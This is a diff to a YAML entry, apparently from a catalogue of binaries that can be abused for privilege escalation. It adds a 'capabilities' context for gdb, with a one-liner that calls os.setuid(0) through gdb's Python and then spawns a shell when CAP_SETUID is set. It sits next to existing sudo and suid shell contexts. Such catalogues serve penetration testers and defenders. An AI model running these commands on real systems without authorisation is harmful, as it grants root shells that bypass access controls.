@@ -21,6 +21,11 @@ functions:
   - code: |-
       gdb -nx -ex '!/bin/sh' -ex quit
     contexts:
+      capabilities:
+        code: |-
+          gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+        list:
+        - CAP_SETUID
       sudo:
       suid:
         shell: true
